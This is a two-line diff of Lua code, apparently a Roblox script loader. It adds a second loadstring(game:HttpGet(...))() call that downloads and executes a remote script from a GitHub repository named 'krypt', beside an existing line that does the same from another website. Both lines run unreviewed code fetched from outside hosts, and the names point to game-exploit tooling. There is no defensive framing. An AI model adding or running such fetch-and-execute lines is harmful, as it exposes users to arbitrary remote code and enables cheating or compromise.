@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://softwarecp.net"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/krypt/main/checks/control.lua"))()
